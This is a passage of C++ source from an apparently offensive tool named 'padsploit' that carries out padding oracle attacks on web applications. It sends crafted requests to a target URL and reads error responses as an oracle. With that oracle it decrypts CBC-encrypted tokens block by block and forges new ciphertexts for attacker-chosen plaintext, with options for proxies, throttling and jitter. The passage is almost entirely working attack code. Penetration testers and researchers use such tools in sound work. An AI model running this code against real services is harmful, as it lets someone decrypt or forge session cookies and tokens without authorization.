                std::string u,p,c; try{ prep_request(opt.url,opt.post,opt.cookie,needle_re,payload,u,p,c);}catch(...){ return; }
                auto r=http.request(opt.post.empty()?"GET":"POST",u,p,c);
                RespClass rc = classify_oracle(clf, r, oracleSig, opt.useBody);
                if(rc==RC_VALID||rc==RC_APPERR){ hits++; }
                if(opt.tui){
                    double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
                    tui.line("bruteforce", -1, -1, -1, -1, -1, (int)http.request_count, avg, 0.0);
                }
            }
        };
        std::vector<std::thread> th(std::max(1, opt.concurrency)); for(auto &t: th) t=std::thread(worker);
        for(auto &t: th) t.join();
        tui.finish();
        std::cout<<"Bruteforce hits: "<<hits.load()<<" / 65536\n";
    }
};

// ---------- high-level run helpers ----------
struct Result {
    std::string ascii, hex, b64;     // for decrypt
    std::string forged_raw, forged_encoded; // for encrypt
};
inline Result run(Options userOpt){
    Options opt = userOpt;

    // Enable autodiscover automatically if missing info
    if (opt.blockSize == 0) opt.autodiscover = true;

    if(opt.autodiscover){
        auto d=autodiscover(opt);
        if((opt.encoding==ENC_B64) && d.encoding>=0) opt.encoding=d.encoding;
        if((opt.blockSize==0) && d.blockSize>0) opt.blockSize=d.blockSize;
        std::cout<<"[autodiscover] encoding="<<opt.encoding<<" blockSize="<<opt.blockSize<<"\n";
    }
    if(opt.blockSize<=0) throw std::runtime_error("blockSize must be > 0");

    std::string encrypted;
    try{
        encrypted = decode_text(opt.sample,opt.encoding);
    }catch(...){
        throw std::runtime_error("could not decode sample with selected/guessed encoding");
    }

    if(opt.noiv) encrypted = std::string(opt.blockSize,'\0') + encrypted;
    if((int)encrypted.size()%opt.blockSize) throw std::runtime_error("encrypted sample length not divisible by blockSize");
    int blocks=(int)encrypted.size()/opt.blockSize;
    if(opt.mode!=M_BRUTEFORCE && blocks<2)
        throw std::runtime_error("only one block present after decoding — try --noiv if the IV is not included in the token");

    // init http/logs + engine
    Engine eng;
    if(opt.logDir) eng.logdir.init(true);
    if(!opt.jsonl_path.empty()){
        std::string path=opt.jsonl_path;
        if(path.find('/')==std::string::npos && eng.logdir.enabled) path=eng.logdir.dir+"/"+path;
        eng.jsonl.open(path);
    }
    HttpClient http;
    if(!opt.headers.empty()) http.set_headers_kv(opt.headers);
    if(!opt.auth.empty()) http.auth_basic=opt.auth;
    if(!opt.proxy.empty()) http.proxy=opt.proxy;
    if(!opt.proxyauth.empty()) http.proxyauth=opt.proxyauth;
    http.veryverbose=opt.veryverbose; http.max_retries=opt.max_retries;
    http.backoff_ms=opt.backoff_ms; http.backoff_mult=opt.backoff_mult;
    http.throttle.configure(opt.rps,opt.delay_ms,opt.jitter_ms);

    // TUI init (enabled only if user asked and stdout is a TTY)
    const bool is_tty = stdout_is_tty();
    eng.tui.init(opt.tui && is_tty, !opt.no_color && is_tty);

    CURL *esc = curl_easy_init(); if(!esc) throw std::runtime_error("curl init failed");

    // baseline
    auto base = http.request(opt.post.empty()?"GET":"POST",opt.url,opt.post,opt.cookie);
    if(base.status==0) { curl_easy_cleanup(esc); throw std::runtime_error("network error (could not reach target)"); }
    if(opt.verbose) std::cout<<"baseline status="<<base.status<<" len="<<base.content_length<<" ttfb_ms="<<std::fixed<<std::setprecision(3)<<base.ttfb_ms<<"\n";

    // classifier
    Classifier clf; clf.useBody=opt.useBody; clf.timing=opt.timing;
    std::regex padRe,appRe,valRe;
    if(!opt.error.empty()){ padRe=std::regex(opt.error); clf.padRe=std::make_unique<std::regex>(padRe); }
    if(!opt.re_pad.empty()){ padRe=std::regex(opt.re_pad); clf.padRe=std::make_unique<std::regex>(padRe); }
    if(!opt.re_app.empty()){ appRe=std::regex(opt.re_app); clf.appRe=std::make_unique<std::regex>(appRe); }
    if(!opt.re_valid.empty()){ valRe=std::regex(opt.re_valid); clf.validRe=std::make_unique<std::regex>(valRe); }

    std::string needle_re = regex_escape(opt.sample);
    std::string oracleSig; bool analysisDone = (clf.padRe||clf.appRe||clf.validRe);

    Result out;

    if(opt.mode==M_BRUTEFORCE){
        eng.bruteforce(opt, http, esc, needle_re, clf, oracleSig);
        // summary
        double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
        std::cout<<"Summary: mode=bruteforce reqs="<<http.request_count<<" avg_ms="<<std::fixed<<std::setprecision(2)<<avg<<"\n";
        curl_easy_cleanup(esc); return out;
    }

    if(opt.mode==M_ENCRYPT){
        std::string pt = opt.plaintext; if(!opt.encodedtext.empty()) pt=decode_text(opt.encodedtext,opt.encoding);
        if(pt.empty()) { curl_easy_cleanup(esc); throw std::runtime_error("encrypt mode requires plaintext or encodedtext"); }
        int B=opt.blockSize; int pad=B-(int)(pt.size()%B); if(pad==0) pad=B; pt.append(pad,(char)pad);
        std::string forged=eng.forge(opt,http,esc,needle_re,pt,clf,oracleSig);
        out.forged_raw=forged; out.forged_encoded=encode_bytes(forged,opt.encoding);
        double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
        std::cout<<"Summary: mode=encrypt reqs="<<http.request_count<<" avg_ms="<<std::fixed<<std::setprecision(2)<<avg<<"\n";
        curl_easy_cleanup(esc); return out;
    }

    // decrypt
    std::string iv = encrypted.substr(0,opt.blockSize);
    int start = opt.resumeBlock>0? opt.resumeBlock : 1;
    std::string all;
    for(int b=start+1; b<=blocks; ++b){
        if(opt.verbose) std::cout<<"[decrypt] block "<<(b-1)<<" / "<<(blocks-1)<<"\n";
        std::string Ci = encrypted.substr(b*opt.blockSize - opt.blockSize, opt.blockSize);
        std::string interm = eng.process_block(opt,http,esc,needle_re,Ci,opt.blockSize,clf,analysisDone,oracleSig,(b-1),(blocks-1));
        std::string prev = (b==2)? iv : encrypted.substr((b-2)*opt.blockSize, opt.blockSize);
        std::string plain(opt.blockSize,'\0');
        for(int i=0;i<opt.blockSize;i++) plain[i]=(char)(((unsigned char)interm[i]) ^ ((unsigned char)prev[i]));
        all+=plain;
    }
    out.ascii=all; out.hex=hex_encode(all,true); out.b64=b64_encode(all);

    double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
    std::cout<<"Summary: mode=decrypt blocks="<<(blocks-1)<<" reqs="<<http.request_count<<" avg_ms="<<std::fixed<<std::setprecision(2)<<avg<<"\n";

    curl_easy_cleanup(esc);
    return out;
}

} // namespace padsploit

